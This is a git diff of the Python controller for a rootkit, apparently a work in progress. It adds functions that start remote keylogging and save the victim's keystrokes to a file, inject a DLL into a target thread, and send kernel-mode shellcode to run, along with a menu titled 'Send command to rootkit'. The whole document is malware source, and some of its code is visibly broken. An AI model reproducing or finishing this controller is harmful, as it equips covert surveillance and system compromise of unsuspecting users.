@@ -9,12 +9,11 @@ KEYLOGGING_LOG_FILE = "keylog.txt"
 
 SHOULD_KEYLOG = False
 
-def handle_keylogging(sock, logfile: str):
-    while True:
+def handle_keylogging(conn: socket.socket, logfile: str):
+    while SHOULD_KEYLOG:
         with open(logfile, "a+") as file:
-          conn, _ = sock.accept()
-
-        
+            buf = conn.recv(4096)
+            file.write(buf.decode())            
 
 
 def start_keylogging(conn: socket.socket, ip: str, port: int = KEYLOGGING_PORT, query_interval: int = KEYLOGGING_QUERY_INTERVAL,
@@ -22,9 +21,11 @@ def start_keylogging(conn: socket.socket, ip: str, port: int = KEYLOGGING_PORT, 
     request = f"start_keylogging\n{ip}\n{port}\n{query_interval}"
     sock = socket.socket()
     sock.bind(("0.0.0.0", port))
-    sock.listen()
+    sock.listen(1)
+    SHOULD_KEYLOG = True
     conn.send(request)
     keylog_sock, _ = conn.accept()
+    threading.Thread(target=handle_keylogging, args=(keylog_sock, logfile)).start()
 
 
 def inject_dll_to_thread(conn: socket.socket, tid: int, dll_path: str):
@@ -39,14 +40,22 @@ def run_km_shellcode(conn: socket.socket, shellcode_path: str, input: bytes):
         base64_contents = base64.b64encode(shellcode.read()).decode()
     conn.send(f"run_km\n{base64.b64encode(input).decode()}\n{base64_contents}")
 
+
+def menu():
+    print("""Send command to rootkit:
+    1. Start keylogging
+    2. Send library to inject
+    3. Send km shellcode""")
+
 def handle_client(conn: socket.socket):
     while True:
         command = input("Command: ")
-        if command == ""
+        if command == "":
+            ...
 
 def main():
     print("Start attacking and stuff")
-    with socket.socket() as server, socket.socket() as keylogging_socket:
+    with socket.socket() as server:
         server.bind("0.0.0.0", 9191)
         server.listen(1)
         
